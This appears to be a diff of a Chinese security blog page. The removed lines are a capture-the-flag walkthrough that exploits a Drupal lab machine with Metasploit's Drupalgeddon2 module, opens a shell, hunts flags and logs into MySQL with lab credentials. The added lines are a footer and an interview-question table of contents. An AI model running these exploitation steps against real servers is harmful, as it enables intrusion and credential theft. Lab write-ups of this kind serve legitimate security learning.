-<li><h2 id="漏洞查找与利用"><a href="#漏洞查找与利用" class="headerlink" title="漏洞查找与利用"></a>漏洞查找与利用</h2></li>
-</ol>
-<p>什么是Drupal</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MTljNzEzZDY2ZGIzNjVjZjE0NTFjNGRhMDI3ZmYzNTRfZkdCZDE5OWRXd1daQWdZYmxHc2l5MUJKZnlyRlczbnNfVG9rZW46UkwyUWJKZnRwb1VGdHZ4VG12NGNnTTQ5bkppXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>知道cms，我们一般从cms出发找漏洞，百度一下drupal漏洞</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YzlmOTVjNGFiZTc4MzE1MDEyOWU4YzRhMTgwYTRjNDNfV2pVVXZMamgyNnlzVFpRTTY3N0pReW5qd283WEw3TDRfVG9rZW46SzNYQWJOVGphbzZwcDR4T2VhZmN4WDl2bllkXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>或者在工具中打开</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MzhhOTBhOGM2MTA5MTc1MzgyODZjNTY1ZWY4MmIxNDRfSGVSMFFkdFNWanhGSXptNTdjTnFiRndiUUZQclFQYm9fVG9rZW46SVFFdWJyZk05bzVCdWl4ZXhHdGNDRU1XbkpiXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>代开之后在里面搜索drupal</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NTQwZWNjZjZhNTQwZDQwNDE4MWUxNTkwZDhjYzIyNTJfZEo3N0tjelA5UlM4MGl5QmRzb1gyQzFDRXRjcXFtQVFfVG9rZW46QTNvZGI3ak5qbzRONnZ4NzQyVGMxelVrbnBjXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>这里是drupal的漏洞</p>
-<h3 id="①漏洞查找"><a href="#①漏洞查找" class="headerlink" title="①漏洞查找"></a>①漏洞查找</h3><p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YjZiM2M3OThiYjcxMTI5MTkxMDkxZWRmNTY3ZWM1YWVfalJOa1ZnaEJMdW5HNGZoN2FreXNRb1owSVNHcmpyVmNfVG9rZW46VkFvQmJ3aWFKb0J5Q2x4Z1dQZ2Nkb0V2bkNmXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>用工具Metasploit（目前世界上领先的<a href="https://so.csdn.net/so/search?q=%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95&spm=1001.2101.3001.7020">渗透测试</a>工具，也是信息安全与渗透测试领域最大的开源项目之一），找一下漏洞，先打开工具</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">metasploit</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MzgzM2I4ZDRlOGI4OGY1YzEyOWMyMDQ4Njc3NTNlZGZfSHNlOEZHMWxYdERoU2JPVnlhYmdUQlhmZXlXNHhuUWhfVG9rZW46RGZDRmJaNnJZb0RKTXZ4SUxnMWMxcGFPbjFnXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>然后输入命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search Drupal</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjUwODgwMWFlNmExNzBiMzcwNjE5YzFhN2I2N2EzMmNfYVp0N25KSDVKQVZseDJYdG1ORzFHRXRIU1MxNGp6bUlfVG9rZW46Q3Q5UGJGajNPb1NPaW54Mnh0d2NrR0p1bnpkXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>这些就是Drupal的漏洞，可以看到漏洞还挺多的</p>
-<p>在这里面使用 1  exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection  这个脚本</p>
-<p>输入：<code>use 1</code></p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MTI4YjQ5YThjYmU0YmE2NjA0NTBjMjE3OWNiOTA1MmRfenpmZXU2MUg1eGdJMmh3a3JLd051UnJxV0htVlV5UU9fVG9rZW46UjVaRmJuNmpEb3U0bGR4OVJ0UmNtaWNNbjRiXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>接着看一下该漏洞模块参数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTVlMTY3NDlhMmFlOGY1ZmFiNjkxYzc5YjY3MzM2YTZfcURnM0VncmpRR1VyS20zVmhKR0lPUHRDZTBvY0ZuSlpfVG9rZW46SlE4bWJQMllZb0FrU1F4WmxWd2M3RWpjbmVoXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<blockquote>
-<p>Current Setting是目前设置的内容 Required表示是否需要设置内容，yes为必须设置，no可以设置也可不设置 就上面来说RHOSTS需要set，但是没有内容</p>
-</blockquote>
-<p>所以接着我们来设置一下RHOSTS内容（就是攻击目标IP地址，靶场地址）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set RHOSTS 192.168.217.18</span><br></pre></td></tr></table></figure>
 
-<p>然后再show一下模块参数</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=OWE3MjBjZjUyNDljMDhhNGVjN2ZiZjNhMGQwZTFhOGVfUWNFOWhtcnlVVFlCdFZic0I0anF5WDhRdjlIMmo0STRfVG9rZW46SHJpSWJyUkVpbzhVNDZ4T1M3bWNVTlhUbnlmXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>设置好参数后开始攻击</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">John Doe</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.27.0">Stellar 1.27.0</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
 
-<p>exploit和run是一样的，用run也可以</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTA4MzU1ZWVlODk2NmExNGRjYTQ3NmVkODZkNWU1NGJfNFdQTEhQRFRBUFl4SVR0VXhPeGc5TnN4c3BRVkVNVFNfVG9rZW46VmNHNGJCRjZFb1ZVRGN4cXNva2NJVjVlbmdoXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>出现Meterpreter session 1 opened（kali和目标ip的连接）就说明攻击成功啦，接下来我们可以直接上shell</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YmIzYTQ5ZjYwYmIwNTViZDA3MDFlOTNmNjg2MzU3YmRfaE9VT1RvSnpMZERYTWRlT3RZclBHdnU2ek83UW94YzdfVG9rZW46UzdqUGJ3YkZPb1JvVnF4YklYUGN5QUZZblM2XzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<ol>
-<li><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2></li>
-</ol>
-<h3 id="①获取普通shell"><a href="#①获取普通shell" class="headerlink" title="①获取普通shell"></a>①获取普通shell</h3><p>然后执行ls命令</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NWQzY2ZhNjcwMWVkYzlkY2UyOTg3ZTBmN2YxZjVmNWFfbkU2RnBtZnVjMWNtRkdzU3VQVHhPU0hGa1liYnhFR2JfVG9rZW46U3NQVGIwQ1dabzRIVDN4c2kwbmM5OUl2bjFmXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<h3 id="②获取交互shell"><a href="#②获取交互shell" class="headerlink" title="②获取交互shell"></a>②获取交互shell</h3><p>这样看起来有点费劲，不过我们可以利用python实现互交shell，这样就好看一点，使用的前提是攻击主机上必须装有python</p>
-<p>“我不会安装python”</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
 
-<p>这是一个固定姿势，直接复制就能用</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTlkMTRkNWM3MTIzNDgyNGViZWRkZDU3ZDE3M2Q5YTdfTnBnb1RjSWRXcHJhOWowUXc0OXpNWVBJb1lSS1dKYVNfVG9rZW46T0VyTmJPNUFpb2szeVR4WEZ6amNINURGbmNoXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>可以看到这个shell的权限只是普通权限，还不是root，不过还能看看文件啦，先看一下发现的flag1.txt文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat flag1.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=OGZhNzJiYmJhZjMzMGU0MTZkMzNmYTQzMjM4NmE1N2ZfRDloODRWRjJ3OVlSY2FTcW5Xc2VVa0RKSTI5NlUxQkpfVG9rZW46SlhqOWJ6Mjdqb0p6QVZ4TmJqTGNMbmxjblZnXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>翻译过来就是：每个好的CMS都需要一个配置文件，你也一样，emmm，这个先放着，看看还有没有其他flag文件</p>
-<p>我们再看看有没有其他flag文件 <code>find / -name flag*</code></p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmUxZjBhMjIwOWNkMDM2MzUwMGNkZmQ5ZTczOWZlZDFfUjUwMUI0bWljVU9QaGNyUkV1TmNqU3A3SFhQOEU4RjNfVG9rZW46RllPUWJkZUc5b25QQlN4VXlJN2M4Y29vblNmXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>好吧只有一个，我们再看看他的配置文件，一般来说配置文件都有一些特别重要的信息在里面，搞不好还能提权，百度Drupal配置文件（每一个好的CMS都需要一个配置文件）</p>
-<p>下一个攻克点提示在配置文件中</p>
-<p>百度找到的durpal的配置文件是 &#x2F;vsr&#x2F;www&#x2F;sites&#x2F;default&#x2F;settings.php</p>
-<p>进入durpal配置文件</p>
-<p>逐层解剖 找到flag2文件 进行读取</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NmQ1ZWFhNDFjNzlmMjk1NWNkNzdmZmNjOWY4NWNhMWRfY3FRaFRYVzlDMElVcnlHanlCOWxzakE2d1pKMlBrODlfVG9rZW46U0V2bWJFZGkyb0lIYmx4NElBb2NGY0p0bmtiXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MzFiMzZiMjUyODY2Y2UwYmI3YjY5N2YyNTA0NjczNDBfdUx4VEJWU2ZSUWlyanFwU0liakptaUtSVjBXcTBodElfVG9rZW46VHFZa2I1Vzg4b2haZDJ4WEFkOGNweXpYbndFXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<ol>
-<li><h2 id="数据库渗透"><a href="#数据库渗透" class="headerlink" title="数据库渗透"></a>数据库渗透</h2></li>
-</ol>
-<p>发现第二个flag以及数据可以账号密码、咱们登录一下</p>
-<p><code>mysql -udbuser -pR0ck3t</code>  mysql -u dbuser -p </p>
-<p>mysql -u dbuser -p </p>
-<p>Enter password: R0ck3t</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YTVjYThhM2M0YmM1ZTJiOTViMjk0OTZmMzQxZjdjZWNfTmJDNlJLdUR6SUFQWkdtSXNtb1VUanFGZW4zMDJPc0lfVG9rZW46SXVkQ2JVNHIxbzJ1TWd4Y01namM4d0FwbjF5XzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>登进去了，这样我们就可以为所欲为修改数据库了，先看看有啥好东西</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure>
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E9%A2%98"><span class="toc-text">网络安全面试题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-php%E7%88%86%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%9F"><span class="toc-text">1.php爆绝对路径的方法？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1%E5%8D%95%E5%BC%95%E5%8F%B7%E5%BC%95%E8%B5%B7%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8A%A5%E9%94%99"><span class="toc-text">1.1单引号引起数据库报错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2%E8%AE%BF%E9%97%AE%E9%94%99%E8%AF%AF%E5%8F%82%E6%95%B0%E6%88%96%E9%94%99%E8%AF%AF%E8%B7%AF%E5%BE%84"><span class="toc-text">1.2访问错误参数或错误路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3%E6%89%AB%E6%8F%8F%E5%BC%80%E5%8F%91%E6%9C%AA%E5%88%A0%E9%99%A4%E7%9A%84%E6%B5%8B%E6%97%B6%E6%96%87%E4%BB%B6-%E6%8E%A2%E9%92%88%E7%B1%BB%E6%96%87%E4%BB%B6%E5%A6%82phpinfo"><span class="toc-text">1.3扫描开发未删除的测时文件&#x2F;探针类文件如phpinfo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4google-hacking"><span class="toc-text">1.4google hacking</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5phppmyadmin%E7%88%86%E8%B7%AF%E5%BE%84-phpmyadmin-libraries-lect-lang-lib-php"><span class="toc-text">1.5phppmyadmin爆路径:&#x2F;phpmyadmin&#x2F;libraries&#x2F;lect_lang.lib.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-6%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E8%AF%BB%E5%8F%96%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%89%BE%E8%B7%AF%E5%BE%84"><span class="toc-text">1.6利用漏洞读取配置文件找路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-7%E6%81%B6%E6%84%8F%E4%BD%BF%E7%94%A8%E7%BD%91%E7%AB%99%E5%8A%9F%E8%83%BD"><span class="toc-text">1.7恶意使用网站功能</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BD%A0%E5%B8%B8%E7%94%A8%E7%9A%84%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%8C%E6%9C%80%E9%95%BF%E7%94%A8%E7%9A%84%E6%97%B6%E9%82%A3%E4%B8%AA"><span class="toc-text">2.你常用的渗透工具有哪些，最长用的时那个</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-xss%E7%9B%B2%E6%89%93%E5%88%B0%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-text">3.xss盲打到内网服务器的利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E9%B1%BC%E5%8F%89%E5%BC%8F%E6%94%BB%E5%87%BB%E5%92%8C%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB%EF%BC%9F"><span class="toc-text">4.鱼叉式攻击和水坑攻击？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E4%BB%80%E4%B9%88%E6%98%AF%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%EF%BC%9F"><span class="toc-text">5.什么是虚拟机逃逸？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%8E%9F%E7%90%86%E5%B9%B6%E4%B8%94%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1"><span class="toc-text">6.中间人攻击的原理并且如何防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%EF%BC%9F"><span class="toc-text">7.TCP三次握手过程？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B%EF%BC%9F"><span class="toc-text">8.七层模型？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-%E5%AF%B9%E4%BA%8E%E4%BA%91%E5%AE%89%E5%85%A8%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-text">9.对于云安全的理解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-%E4%BA%86%E8%A7%A3%E8%BF%87websocket%E5%90%97%EF%BC%9F"><span class="toc-text">10.了解过websocket吗？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-DDOS%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9FCC%E6%94%BB%E5%87%BB%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">11.DDOS是什么？有哪些？CC攻击是什么？区别是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-land%E6%94%BB%E5%87%BB%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-text">12.land攻击是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13-%E4%BD%A0%E4%BC%9A%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%9F"><span class="toc-text">13.你会如何进行信息收集？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14-%E4%BB%80%E4%B9%88%E6%98%AFCRLF%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%9F"><span class="toc-text">14.什么是CRLF注入攻击？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#15-%E9%98%B2%E6%AD%A2XSS%EF%BC%8C%E5%89%8D%E7%AB%AF%E5%90%8E%E7%AB%AF%E4%B8%A4%E4%B8%AA%E8%A7%92%E5%BA%A6%EF%BC%9F"><span class="toc-text">15.防止XSS，前端后端两个角度？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#16-%E5%A6%82%E4%BD%95%E9%98%B2%E6%8A%A4%E4%B8%80%E4%B8%AA%E7%AB%AF%E5%8F%A3%E7%9A%84%E5%AE%89%E5%85%A8%EF%BC%9F"><span class="toc-text">16.如何防护一个端口的安全？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#17-webshell%E6%A3%80%E6%B5%8B%E6%80%9D%E8%B7%AF%EF%BC%9F"><span class="toc-text">17.webshell检测思路？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#18-%E5%8F%91%E7%8E%B0IIS%E7%9A%84%E7%BD%91%E7%AB%99%EF%BC%8C%E6%80%8E%E6%A0%B7%E8%AF%95%E5%AE%83%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%9F%EF%BC%88%E6%A0%B9%E6%8D%AE%E7%89%88%E6%9C%AC%EF%BC%89"><span class="toc-text">18.发现IIS的网站，怎样试它的漏洞？（根据版本）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#19-GPC%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E5%BC%80%E5%90%AF%E4%BA%86%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87"><span class="toc-text">19.GPC是什么？开启了怎么绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#20-web%E5%B8%B8%E7%94%A8%E7%9A%84%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E6%9C%89%E4%BB%80%E4%B9%88"><span class="toc-text">20.web常用的加密算法有什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#21-XSS%E9%99%A4%E4%BA%86%E8%8E%B7%E5%8F%96cookies%E8%BF%98%E8%83%BD%E5%81%9A%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">21.XSS除了获取cookies还能做什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#22-%E8%BF%90%E8%90%A5%E5%95%86%EF%BC%88%E6%88%96%E5%85%B6%E4%BB%96%EF%BC%89%E7%BD%91%E7%BB%9C%E5%8A%AB%E6%8C%81"><span class="toc-text">22.运营商（或其他）网络劫持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#23-DNS%E6%AC%BA%E9%AA%97%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-text">23.DNS欺骗是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#24-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E5%92%8C%E9%98%B2%E5%BE%A1"><span class="toc-text">24.缓冲区溢出原理和防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#25-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="toc-text">25.网络安全事件应急响应</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#26-%E4%BC%81%E4%B8%9A%E5%86%85%E9%83%A8%E5%AE%89%E5%85%A8"><span class="toc-text">26.企业内部安全</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#27-%E4%B8%9A%E5%8A%A1%E4%B8%8A%E7%BA%BF%E5%89%8D%EF%BC%8C%E6%80%8E%E4%B9%88%E6%B5%8B%E8%AF%95%EF%BC%8C%E4%BB%8E%E5%93%AA%E4%BA%9B%E8%A7%92%E5%BA%A6%E6%B5%8B%E8%AF%95"><span class="toc-text">27.业务上线前，怎么测试，从哪些角度测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#28-%E5%BA%94%E7%94%A8%E6%9C%89%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BD%86%E6%98%AF%E6%97%A0%E6%B3%95%E4%BF%AE%E5%A4%8D%E5%92%8C%E5%81%9C%E7%94%A8%EF%BC%8C%E4%BD%A0%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-text">28.应用有漏洞，但是无法修复和停用，你怎么办</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#29-CSRF%E6%80%8E%E4%B9%88%E9%98%B2%E6%8A%A4%EF%BC%9F"><span class="toc-text">29.CSRF怎么防护？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#30-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%EF%BC%9F"><span class="toc-text">30.文件上传绕过方法？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#31-%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-text">31.验证码相关利用点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32-cookie%E4%BD%A0%E4%BC%9A%E6%B5%8B%E8%AF%95%E4%BB%80%E4%B9%88%E5%86%85%E5%AE%B9"><span class="toc-text">32.cookie你会测试什么内容</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#33-%E8%AF%B4%E5%87%BA%E5%87%A0%E4%B8%AA%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%EF%BC%9F"><span class="toc-text">33.说出几个业务逻辑漏洞类型？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#34-%E7%AE%80%E8%BF%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-text">34.简述文件包含漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#35-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%EF%BC%8C%E7%94%A8%E6%88%B7%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%9C%89%E4%BB%80%E4%B9%88%E4%BE%8B%E5%AD%90%EF%BC%8C%E5%9B%A0%E4%B8%BA%E4%BB%80%E4%B9%88%E5%9B%A0%E7%B4%A0%E5%AF%BC%E8%87%B4%E7%9A%84%EF%BC%9F"><span class="toc-text">35.业务逻辑漏洞，用户任意密码重置有什么例子，因为什么因素导致的？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#36-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B%E4%B8%AD%E5%8F%91%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%8F%AA%E8%83%BD%E4%B8%8A%E4%BC%A0zip%E6%96%87%E4%BB%B6%E7%9A%84%E5%8A%9F%E8%83%BD%EF%BC%8C%E6%9C%89%E4%BB%80%E4%B9%88%E5%8F%AF%E8%83%BD%E7%9A%84%E6%80%9D%E8%B7%AF%EF%BC%9F"><span class="toc-text">36.渗透测试过程中发现一个只能上传zip文件的功能，有什么可能的思路？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#37-%E4%B8%BA%E4%BB%80%E4%B9%88aspx%E6%9C%A8%E9%A9%AC%E6%9D%83%E9%99%90%E6%AF%94asp%E5%A4%A7%EF%BC%9F"><span class="toc-text">37.为什么aspx木马权限比asp大？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#38-%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%E6%9C%89%E5%93%AA%E4%BA%9B%E6%80%9D%E8%B7%AF%EF%BC%9F"><span class="toc-text">38.只有一个登录页面有哪些思路？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#39-%E8%AF%B7%E6%B1%82%E5%A4%B4%E4%B8%AD%E5%93%AA%E4%BA%9B%E6%98%AF%E6%9C%89%E5%8D%B1%E5%AE%B3%E7%9A%84%EF%BC%9F"><span class="toc-text">39.请求头中哪些是有危害的？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#40-%E8%B0%88%E8%B0%88%E6%B0%B4%E5%B9%B3-%E5%9E%82%E7%9B%B4-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">40.谈谈水平&#x2F;垂直&#x2F;未授权越权访问的区别?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#41-xss%E6%9C%89%E4%BB%80%E4%B9%88%EF%BC%9F%E6%89%A7%E8%A1%8C%E5%AD%98%E5%82%A8%E5%9E%8B%E7%9A%84xss%E7%9A%84%E5%8D%B1%E5%AE%B3%E5%92%8C%E5%8E%9F%E7%90%86"><span class="toc-text">41.xss有什么？执行存储型的xss的危害和原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#42-%E4%B8%BB%E6%9C%BA%E7%96%91%E4%BC%BC%E9%81%AD%E5%88%B0%E5%85%A5%E4%BE%B5%EF%BC%8C%E8%A6%81%E7%9C%8B%E5%93%AA%E9%87%8C%E7%9A%84%E6%97%A5%E5%BF%97"><span class="toc-text">42.主机疑似遭到入侵，要看哪里的日志</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 